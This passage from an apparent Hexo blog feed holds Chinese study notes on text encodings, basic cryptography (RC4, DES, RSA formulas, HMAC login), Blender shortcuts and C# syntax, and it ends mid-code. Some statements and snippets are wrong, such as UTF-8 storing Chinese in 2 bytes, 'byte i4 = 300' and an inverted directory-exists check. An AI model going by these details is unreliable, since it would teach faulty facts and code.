        <content type="html"><![CDATA[<h1 id="Crypto编码"><a href="#Crypto编码" class="headerlink" title="Crypto编码"></a>Crypto编码</h1><hr><h2 id="一、常见编码"><a href="#一、常见编码" class="headerlink" title="一、常见编码"></a>一、常见编码</h2><blockquote><p><a href="https://blog.csdn.net/Ahuuua/article/details/109189985">密码学常见编码</a></p></blockquote><h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1 URL编码"></a>1 URL编码</h3><blockquote><p>%num（十六进制）：用于url中</p></blockquote><h3 id="2-HTML编码"><a href="#2-HTML编码" class="headerlink" title="2 HTML编码"></a>2 HTML编码</h3><blockquote><p>&amp;#num （十进制）：用于html中</p></blockquote><h3 id="3-UTF-8"><a href="#3-UTF-8" class="headerlink" title="3 UTF-8"></a>3 UTF-8</h3><blockquote><p>UTF-16：英文 2B，中文 2B。（浪费空间，被优化成了 UTF-8）</p><p>UTF-8：英文 1B，中文 2B。</p></blockquote><h3 id="4-base家族"><a href="#4-base家族" class="headerlink" title="4 base家族"></a>4 base家族</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/454458711">base全家桶概念</a></p><p><a href="http://www.metools.info/code/base92.html">base92解密</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学理论知识</title>
      <link href="/posts/30ce291f.html"/>
      <url>/posts/30ce291f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto理论"><a href="#Crypto理论" class="headerlink" title="Crypto理论"></a>Crypto理论</h1><blockquote><p><a href=".\7302411">text::Crypto密码</a></p></blockquote><hr><h2 id="一、密码学概论"><a href="#一、密码学概论" class="headerlink" title="一、密码学概论"></a>一、密码学概论</h2><blockquote><p><a href="https://blog.csdn.net/A33280000f/article/details/118304531">official::四种密码学攻击</a></p></blockquote><hr><h2 id="二、古典密码"><a href="#二、古典密码" class="headerlink" title="二、古典密码"></a>二、古典密码</h2><h3 id="1-置换加密"><a href="#1-置换加密" class="headerlink" title="1 置换加密"></a>1 置换加密</h3><ul><li><p>定义</p><blockquote><p>字符的位置与其他字符发生变换。</p></blockquote></li></ul><h3 id="2-代换加密"><a href="#2-代换加密" class="headerlink" title="2 代换加密"></a>2 代换加密</h3><ul><li><p>定义</p><blockquote><p>字符用其他字符代替。</p></blockquote></li></ul><h3 id="3-词频分析"><a href="#3-词频分析" class="headerlink" title="3 词频分析"></a>3 词频分析</h3><blockquote><p><a href="https://quipqiup.com/">词频分析网站</a></p></blockquote><hr><h2 id="三、信道通信"><a href="#三、信道通信" class="headerlink" title="三、信道通信"></a>三、信道通信</h2><hr><h2 id="四、现代密码"><a href="#四、现代密码" class="headerlink" title="四、现代密码"></a>四、现代密码</h2><h3 id="1-序列密码"><a href="#1-序列密码" class="headerlink" title="1 序列密码"></a>1 序列密码</h3><h4 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h4><ul><li><p>定义</p><blockquote><p>序列密码又称流密码（同函数不同密钥）。</p></blockquote></li><li><p>优势</p><ol><li>硬件实现简单。</li><li>可以逐个字符处理。</li><li>有较理想的数学分析工具。</li></ol></li><li><p>用处</p><blockquote><p>军事，外交等国家重要部门的保密通信。</p></blockquote></li><li><p>过程</p><blockquote><p>先由密钥生成一个密钥流序列，再依次加密。</p></blockquote><ul><li>明文流：M = m1m2m3…mi…</li><li>密钥流：K = k1k2k3….ki…</li><li>加密算法：C=c1c2c3…ci… = Ek1(m1)Ek2(m2)….</li><li>解密算法：M=m1m2m3…mo… = Dk1(c1)Dk2(c2)…</li></ul></li><li><p>设计</p><blockquote><p>序列密码的设计重点是密钥流生成器。</p></blockquote></li></ul><h4 id="1-2-分类"><a href="#1-2-分类" class="headerlink" title="1.2 分类"></a>1.2 分类</h4><ul><li><p>自同步流密码</p></li><li><p>异步流密码</p></li></ul><h4 id="1-3-案例"><a href="#1-3-案例" class="headerlink" title="1.3 案例"></a>1.3 案例</h4><ul><li><p>A5算法</p></li><li><p>RC4算法</p><ol><li><p>RC4密码算法原理</p><blockquote><p>RC4算法是一种流密码，密钥长度可变，面向字节操作。以下是原理说明中使用的主要变量。</p></blockquote><ol><li><p>密钥流</p><blockquote><p>RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说，如果明文的长度是500字节，那么密钥流的长度也是500字节，加密生成的密文也是500字节，因为密文第i字节=明文第i字节⊕密钥流第i字节。</p></blockquote></li><li><p>状态数组S</p><blockquote><p>长度为256字节，各单元为S[0]，S[1]，…，S[255]。每个单元为1字节，在算法运行的任何时候，S都包括0～255之间所有的8位二进制数，只不过值的位置发生了变化。</p></blockquote></li><li><p>临时数组T</p><blockquote><p>长度为256字节，每个单元为1字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则轮转地将密钥的每字节赋给T。</p></blockquote></li><li><p>密钥K</p><blockquote><p>长度为1～256字节，密钥的长度与明文的长度、密钥流的长度没有必然关系，通常密钥的长度为16字节（128位）。</p></blockquote></li><li><p>密钥流Ks</p><blockquote><p>由从S的256个单元中按一种系统化的方式选出的一个单元生成，每生成一个Ks，S中的单元就被重新置换一次。</p></blockquote></li></ol><blockquote><p>RC4算法首先使用密钥编排算法（Key Scheduling Algorithm，KSA）来完成S和T的初始化及S的初始置换。在置换时使用密钥K，其长度一般取5～16字节，即40～128位，也可以更长，通常不超过256字节。首先用0～255初始化S，然后使用密钥进行替换。</p><p>完成S的初始化和初始置换后，密钥K就不再被使用了。在S[0]，S[1]，…，S[255]中，对每个S[I]，根据S的当前配置，将S[I]与另一字节置换，输出1字节的密钥流。当S[255]完成置换后，从S[0]开始进行重复操作。</p></blockquote></li><li><p>初始化S</p></li><li><p>随机序列生成</p></li></ol></li></ul><h3 id="2-分组密码"><a href="#2-分组密码" class="headerlink" title="2 分组密码"></a>2 分组密码</h3><h4 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h4><h4 id="2-2-案例"><a href="#2-2-案例" class="headerlink" title="2.2 案例"></a>2.2 案例</h4><ul><li>DES<img src="/posts/30ce291f/DES加密主过程.jpg" alt="img"></li></ul><ol><li><p>DES算法原理</p><blockquote><p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准。</p><p>DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。<br>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。</p></blockquote></li></ol><ul><li>AES</li></ul><h3 id="3-Hash密码"><a href="#3-Hash密码" class="headerlink" title="3 Hash密码"></a>3 Hash密码</h3><blockquote><p><a href="http://www.paper.edu.cn/scholar/paper/wangxiaoyun-2">md5碰撞</a></p></blockquote><ul><li>性质<ol><li>抗碰撞。</li><li>不可逆。</li></ol></li></ul><h3 id="4-公钥密码"><a href="#4-公钥密码" class="headerlink" title="4 公钥密码"></a>4 公钥密码</h3><h4 id="4-1-案例"><a href="#4-1-案例" class="headerlink" title="4.1 案例"></a>4.1 案例</h4><ul><li>RSA</li></ul><blockquote><p><a href="https://xz.aliyun.com/t/2446">常见问题</a></p><p>原理：大质数的分解。</p></blockquote><ol><li>质数p q … 任取（可以不止两个）</li><li>n = p <em> q </em> …</li><li>φ( n ) = ( p - 1 ) <em> ( q - 1 ) </em> …</li><li>gcd( e , φ( n ) ) = 1 ，e为公钥，任取小于φ(n)的数  </li><li>d = e^-1 mod φ( n )，d为私钥</li><li>c = pow( m , e , n ) ，c = m ** e % n </li><li>m = pow ( c , d , n )，m = c ** d % n</li></ol><ul><li>ECC</li></ul><hr><h2 id="五、数字签名"><a href="#五、数字签名" class="headerlink" title="五、数字签名"></a>五、数字签名</h2><hr><h2 id="六、身份认证"><a href="#六、身份认证" class="headerlink" title="六、身份认证"></a>六、身份认证</h2><h3 id="1-HMAC"><a href="#1-HMAC" class="headerlink" title="1 HMAC"></a>1 HMAC</h3><blockquote><p>hmac主要应用在身份验证中</p><p><a href="https://zhuanlan.zhihu.com/p/136590049">HMAC</a></p></blockquote><ol><li>客户端发出登录请求。（假设是浏览器的GET请求） </li><li>服务器返回一个随机值，并在会话中记录这个随机值 。</li><li>客户端将该随机值作为密钥，用户密码进行hmac运算，然后提交给服务器。</li><li>服务器读取用户数据库中的用户密码和步骤2中发送的随机值做与客户端一样的hmac运算，然后与用户发送的结果比较，如果结果一致则验证用户合法。</li></ol><hr><h2 id="七、密钥管理"><a href="#七、密钥管理" class="headerlink" title="七、密钥管理"></a>七、密钥管理</h2>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blender</title>
      <link href="/posts/52bae00c.html"/>
      <url>/posts/52bae00c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Blender"><a href="#Blender" class="headerlink" title="Blender"></a>Blender</h1><hr><h2 id="一、基础操作"><a href="#一、基础操作" class="headerlink" title="一、基础操作"></a>一、基础操作</h2><h3 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="1 快捷键"></a>1 快捷键</h3><blockquote><p>a：全选 </p><p>x：删除 </p><p>shift + a：新建物体 </p><p>alt + z：透视模式</p></blockquote><h3 id="2-视图"><a href="#2-视图" class="headerlink" title="2 视图"></a>2 视图</h3><blockquote><p>~ ：快速选择视图</p><p>小键盘：</p><ul><li>1：主视图</li><li>3：右视图</li><li>7：俯视图</li><li>9：仰视图</li></ul><p>ctrl + num：取相反</p></blockquote><h3 id="3-操作栏"><a href="#3-操作栏" class="headerlink" title="3 操作栏"></a>3 操作栏</h3><blockquote><p>界面最下方有操作提示。</p><p>alt + button：清空指定改变（g，r，s）</p><p>框选：选取物体。</p><p>游标：新生成的物体坐标。</p><ul><li>shift + c：游标归位</li></ul><p>移动：移动选中的物体。</p><ul><li>滚轮：移动视角。</li><li>g：移动物体（+ x/y/z/中键 ：在指定方向移动）（ + meter：移动指定米数）</li></ul><p>旋转：转动选中的物体。</p><ul><li>r：旋转物体（+ x/y/z/中键 ：在指定方向旋转）（ + angle：旋转指定度数）</li></ul><p>缩放：调整物体的尺寸。</p><ul><li>s：调整物体（+ x/y/z/ 中键 ：在指定方向缩放）（ + meter：缩放指定倍数）</li></ul></blockquote><h3 id="4-tab模式"><a href="#4-tab模式" class="headerlink" title="4 tab模式"></a>4 tab模式</h3><blockquote><p>tab：进入物体编辑模式。（点、线、面）</p><p>1、2、3：点、线、面。</p><p>点：</p><p>线：</p><p>面：</p><ul><li>e：挤出：只有选定区域被挤出</li><li>i：内插面</li><li><p>ctrl + r：环切：切出一个线或面（+ 右键：居中切割）/ （+ 滚轮：增加/减少环切线）</p></li><li><p>alt + s：法向缩放（存疑）</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏美术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 建模 </tag>
            
            <tag> Blender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CShape</title>
      <link href="/posts/e2ddfea0.html"/>
      <url>/posts/e2ddfea0.html</url>
      
        <content type="html"><![CDATA[<h1 id="CShape"><a href="#CShape" class="headerlink" title="CShape"></a>CShape</h1><blockquote><p>VS保存为UTF-8：扩展——自定义——搜索ForceUTF8</p><p>VS帮助文档：</p><ol><li>Visual Studio Installer——单个组件——Help Viewer</li><li>VS——帮助——添加和移除帮助内容——索引</li></ol></blockquote><hr><h2 id="一、入门"><a href="#一、入门" class="headerlink" title="一、入门"></a>一、入门</h2><h3 id="1-C-特点"><a href="#1-C-特点" class="headerlink" title="1 C#特点"></a>1 C#特点</h3><blockquote><p>命名方式：<br>1.变量前类型后名字，前小写后大写，例子：intNum，strClass<br>2.函数命名大写，属性命名小写.</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 控制台输出一行（自带换行）</span></span><br><span class="line">Console.WriteLine();</span><br><span class="line"><span class="comment">// 控制台输入一行</span></span><br><span class="line"><span class="built_in">float</span> num = <span class="built_in">float</span>.Parse(Console.ReadLine());</span><br><span class="line"><span class="comment">// 控制台输出一行（不换行）</span></span><br><span class="line">Console.Write();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用命名空间</span></span><br><span class="line"><span class="keyword">using</span> name</span><br><span class="line"><span class="comment">// 定义命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">name</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">name</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="keyword">void</span> name &#123;&#125;</span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line">Main();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 折叠代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">region</span> MyRegion</span></span><br><span class="line"><span class="comment">// 被折叠的代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">endregion</span></span></span><br></pre></td></tr></table></figure><h3 id="2-VS操作"><a href="#2-VS操作" class="headerlink" title="2 VS操作"></a>2 VS操作</h3><blockquote><p>VS的补足中（扳手：属性，方块：方法，长方体：字段）<br>Ctrl + A 全选<br>Ctrl + K + F 自动缩进<br>Ctrl + K + C 注释<br>Ctrl + K + U 取消注释<br>Ctrl + R + R 全体重命名<br>Ctrl + F：选择字符串替换</p><p>类中自动补足类中属性：prop + tab + tab</p></blockquote><hr><h2 id="二、类型"><a href="#二、类型" class="headerlink" title="二、类型"></a>二、类型</h2><h3 id="1-一般类型"><a href="#1-一般类型" class="headerlink" title="1 一般类型"></a>1 一般类型</h3><blockquote><p><a href="https://www.cnblogs.com/zhaoshujie/p/9686027.html">详细文档</a></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.string.format?view=net-5.0">official::官方文档</a></p><p>N元运算符：几个变量参与运算。</p><ol><li>一元运算符：<code>i++</code></li><li>二元运算符： <code>a+b</code></li><li>三元运算符：<code>a?b:c</code></li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 格式化输出设置</span></span><br><span class="line">String str = <span class="built_in">string</span>.Format(<span class="string">&quot;a:&#123;0&#125;,b:&#123;1&#125;&quot;</span>,a,b);</span><br><span class="line"><span class="comment">// 设置空</span></span><br><span class="line"><span class="built_in">char</span> a = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">string</span> a = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转化</span></span><br><span class="line">x = <span class="built_in">int</span>.Parse(a); <span class="comment">// int(a)-&gt;x</span></span><br><span class="line">x = a.ToString(); <span class="comment">// string(a)-&gt;x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式转化（小-&gt;大）</span></span><br><span class="line"><span class="built_in">byte</span> i4 = <span class="number">300</span>;</span><br><span class="line"><span class="built_in">int</span> i3 = i4;</span><br><span class="line"><span class="comment">// 显示转化（大-&gt;小）（会丢失数据）</span></span><br><span class="line"><span class="built_in">int</span> i4;</span><br><span class="line"><span class="built_in">byte</span> i3 = (<span class="built_in">byte</span>) i4;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不同操作方式会导致变量提升</span></span><br><span class="line"><span class="built_in">byte</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 不会类型提升b:byte</span></span><br><span class="line">b += <span class="number">3</span>;</span><br><span class="line"><span class="comment">// 会类型提升为int b:int</span></span><br><span class="line">b = b + <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 依照v1值自动推断类型</span></span><br><span class="line"><span class="keyword">var</span>  v1;</span><br><span class="line"><span class="comment">// 任意类型</span></span><br><span class="line"><span class="built_in">object</span> o1 = <span class="number">1</span>/<span class="literal">true</span>/<span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><h3 id="2-特别类型"><a href="#2-特别类型" class="headerlink" title="2 特别类型"></a>2 特别类型</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 枚举类型（默认是:int类型）</span></span><br><span class="line"><span class="built_in">enum</span> Directon:<span class="built_in">int</span> &#123;up,down&#125;  </span><br><span class="line"><span class="comment">// 字符串枚举：</span></span><br><span class="line">MyEnum enumValue = (MyEnum)Enum.Parse(<span class="keyword">typeof</span>(MyEnum), str);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">枚举多选：</span></span><br><span class="line"><span class="comment"> 1.枚举开头处加上[Flags]</span></span><br><span class="line"><span class="comment"> 2.枚举值为2**n，运算时按位||</span></span><br><span class="line"><span class="comment"> 3.判断时按位&amp;&amp;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可空类型（在变量名后加上?）</span></span><br><span class="line"><span class="built_in">int</span>? num = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 此时获得值需要.Value</span></span><br><span class="line">num.Value;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并运算符（如果空返回后面的值）</span></span><br><span class="line">num3 = num1 ?? <span class="number">5.34</span>;</span><br></pre></td></tr></table></figure><h3 id="3-异常"><a href="#3-异常" class="headerlink" title="3 异常"></a>3 异常</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="keyword">catch</span>( ExceptionName e)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="comment">// 捕获所有异常</span></span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line">Throw e</span><br></pre></td></tr></table></figure><h3 id="4-指针"><a href="#4-指针" class="headerlink" title="4 指针"></a>4 指针</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加上unsafe修饰符即可在函数中使用指针</span></span><br><span class="line"><span class="function"><span class="type">static</span> unsafe <span class="type">void</span> <span class="title">Main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> var = <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span>* p = &amp;var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、结构"><a href="#三、结构" class="headerlink" title="三、结构"></a>三、结构</h2><h3 id="1-选择"><a href="#1-选择" class="headerlink" title="1 选择"></a>1 选择</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>() &#123;&#125;  <span class="keyword">else</span> <span class="keyword">if</span>()  &#123;&#125;  <span class="keyword">else</span>&#123;&#125;</span><br><span class="line"><span class="keyword">switch</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> : <span class="keyword">break</span>;</span><br><span class="line"><span class="literal">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-循环"><a href="#2-循环" class="headerlink" title="2 循环"></a>2 循环</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line"><span class="keyword">while</span>()&#123;&#125;</span><br><span class="line"><span class="keyword">do</span>&#123;&#125;<span class="keyword">while</span>();</span><br></pre></td></tr></table></figure><h3 id="3-方法"><a href="#3-方法" class="headerlink" title="3 方法"></a>3 方法</h3><blockquote><p><code>void</code>可接<code>return;</code>返回</p><p><code>///</code>用于写方法注释</p><p>重载：同名不同参。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建随机数</span></span><br><span class="line">Random random = <span class="keyword">new</span> Random();</span><br><span class="line"><span class="comment">// 产生随机数</span></span><br><span class="line"><span class="built_in">int</span> number = random.Next(<span class="number">1</span>,<span class="number">101</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="四、数组"><a href="#四、数组" class="headerlink" title="四、数组"></a>四、数组</h2><h3 id="1-一维数组"><a href="#1-一维数组" class="headerlink" title="1 一维数组"></a>1 一维数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="built_in">int</span>[] a;</span><br><span class="line"><span class="comment">// 初始化（默认值为0），变量名和类型应当一致，容量为n。</span></span><br><span class="line">a = <span class="keyword">new</span> <span class="built_in">int</span>[n];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接初始化</span></span><br><span class="line">srting[] array = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">2</span>]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>&#125;;</span><br><span class="line"><span class="comment">// 声明+初始化+赋值</span></span><br><span class="line"><span class="built_in">bool</span>[] array = &#123;<span class="literal">true</span>,<span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数组中的每一个元素（不可以改变元素值）</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="built_in">int</span> i <span class="keyword">in</span> array);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 任意数组</span></span><br><span class="line">Array arr1 = <span class="keyword">new</span> ElemType[];  </span><br></pre></td></tr></table></figure><h3 id="2-多维数组"><a href="#2-多维数组" class="headerlink" title="2 多维数组"></a>2 多维数组</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二维数组</span></span><br><span class="line"><span class="built_in">int</span> [,] array = <span class="keyword">new</span> <span class="built_in">int</span>[,];</span><br><span class="line"><span class="comment">// 案例：5行3列</span></span><br><span class="line"><span class="built_in">int</span>[,] any = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">5</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="built_in">int</span>[,,,] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>];</span><br></pre></td></tr></table></figure><h3 id="3-交错数组"><a href="#3-交错数组" class="headerlink" title="3 交错数组"></a>3 交错数组</h3><blockquote><p>定义：不规则的表格（交错数组元素的单位是行（也就是数组））</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>[][] array;</span><br><span class="line">array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">4</span>][];</span><br><span class="line"><span class="comment">// 赋值是赋于一个数组</span></span><br><span class="line">array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">3</span>];    </span><br></pre></td></tr></table></figure><h3 id="4-参数数组"><a href="#4-参数数组" class="headerlink" title="4 参数数组"></a>4 参数数组</h3><blockquote><p>定义在方法参数中。</p><p>对方法内：数组。</p><p>对方法外：可以传入数组，可以传入一组同类型的数组，可以不传入参数。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Add(<span class="keyword">params</span> <span class="built_in">int</span>[] arr);</span><br></pre></td></tr></table></figure><h3 id="5-数组方法"><a href="#5-数组方法" class="headerlink" title="5 数组方法"></a>5 数组方法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得该数组第 n 维的长度。</span></span><br><span class="line">array.GetLength(n);</span><br><span class="line"><span class="comment">// 数组第 0 维的长度。</span></span><br><span class="line">array.Length;</span><br></pre></td></tr></table></figure><hr><h2 id="五、存储"><a href="#五、存储" class="headerlink" title="五、存储"></a>五、存储</h2><h3 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1 数据类型"></a>1 数据类型</h3><blockquote><p>分类：值类型，引用类型。<br>值类型：结构（数据类型，bool/char），枚举，声明栈存入栈。<br>引用类型：接口，类（string，Array，委托，object），声明栈存入堆。</p><p>数组类型传入的是地址。（无需return）<br>bool值类型比较值，引用类型直接比引用。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改的是堆区</span></span><br><span class="line">array[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 修改的是栈区</span></span><br><span class="line">arr = <span class="keyword">new</span> <span class="built_in">int</span>[]&#123;<span class="number">2</span>&#125;;</span><br><span class="line"><span class="comment">// 修改的是栈区（堆中的数据不可修改）</span></span><br><span class="line">S1 = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 值的地址（ref相当于&amp;，等于&amp;a）</span></span><br><span class="line"><span class="keyword">ref</span> <span class="built_in">int</span> a;</span><br><span class="line"><span class="comment">// 输出参数（也是地址操作）</span></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">int</span> a;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 1、out方法内部必须赋值。</span></span><br><span class="line"><span class="comment"> 2、out传参前可以不赋值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试类型转化</span></span><br><span class="line"><span class="built_in">bool</span> [type].TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 可转：返回true和result。</span></span><br><span class="line"><span class="comment"> 不可转：返回false，result = 0。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="2-存储"><a href="#2-存储" class="headerlink" title="2 存储"></a>2 存储</h3><blockquote><p>CG：垃圾回收器（自动回收堆中的无引用数据）。（可手动，一般是交互时间最少的时候回收）</p><p>装箱：值-&gt;object（堆开辟空间，值存入堆中，返回堆地址）<br>拆箱：object-&gt;值（判断类型，返回已经装箱的引用）<br>非常消耗性能。（避免方法：重载，泛型）</p><p>字符串池：S1 =“ab”;  S2=”ab”;    //S1与S2相等<br>每次修改字符串相当于重新开辟了空间，object同理。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可变字符串</span></span><br><span class="line">StringBuilder str = <span class="keyword">new</span> StringBuilder(初始大小);</span><br></pre></td></tr></table></figure><h3 id="3-文件与IO操作"><a href="#3-文件与IO操作" class="headerlink" title="3 文件与IO操作"></a>3 文件与IO操作</h3><ul><li><p>概念</p><blockquote><p>System.IO：文件系统对应类。</p><ul><li>DriveInfo：有关驱动器信息的类。</li><li>File：有关对文件整体操作及内容读写的类。</li><li>FileInfo：和File相似，不同之处是比FILE多了一个Length属性，通过该属性可以了解一个文件所占字节数。</li><li>Directory：有关文件夹的处理。</li><li>DirectoryInfo：功能同Directory，只是所有成员为实例成员。</li><li>Path：专用于对路径字符串的处理。</li></ul></blockquote></li><li><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件操作</span></span><br><span class="line">File.Create();</span><br><span class="line">File.Delete();</span><br><span class="line">File.Move();</span><br><span class="line">File.Copy(old,<span class="keyword">new</span>,<span class="built_in">bool</span>);  <span class="comment">// （是否覆盖原有文件）</span></span><br><span class="line">File.Exists();</span><br><span class="line"><span class="comment">// 读文件</span></span><br><span class="line">File.ReadAllText(path);</span><br><span class="line">File.ReadAllLines(path);</span><br><span class="line">File.ReadLines();</span><br><span class="line">File.ReadAllBytes();</span><br><span class="line"><span class="comment">// 写文件</span></span><br><span class="line">File.WriteAllText(path,<span class="built_in">string</span>);</span><br><span class="line">File.WriteAllLines(path,array);</span><br><span class="line">File.WriteAllBytes();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件夹操作</span></span><br><span class="line">Directory.CreateDirectory(path);</span><br><span class="line">Directory.Delete(path,<span class="built_in">bool</span>);  <span class="comment">// （是否删除子文件夹）</span></span><br><span class="line">Directory.Move();</span><br><span class="line">Directory.GetFiles();  <span class="comment">// 获取文件夹下所有文件名</span></span><br><span class="line">Directory.GetDirectories();  <span class="comment">// 获取文件夹下所有子文件夹名</span></span><br><span class="line">Directory.Exists(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得文件名和扩展名</span></span><br><span class="line">Path.GetFileName();</span><br><span class="line"><span class="comment">// 仅取得文件名</span></span><br><span class="line">Path.GetFileNameWithOutExtension();</span><br><span class="line"><span class="comment">// 取得路径中目录的名称</span></span><br><span class="line">Path.GetDirectoryName();</span><br><span class="line"><span class="comment">// 多个字符串合并成一个路径</span></span><br><span class="line">Path.Combine();</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路径</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> path = <span class="string">@&quot;D:/aa/bb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DirectoryInfo使用</span></span><br><span class="line">DirectoryInfo info = <span class="keyword">new</span> DirectoryInfo(path);</span><br><span class="line"><span class="keyword">if</span>(info.Exists) info.Create();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 流对象读写文件</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span 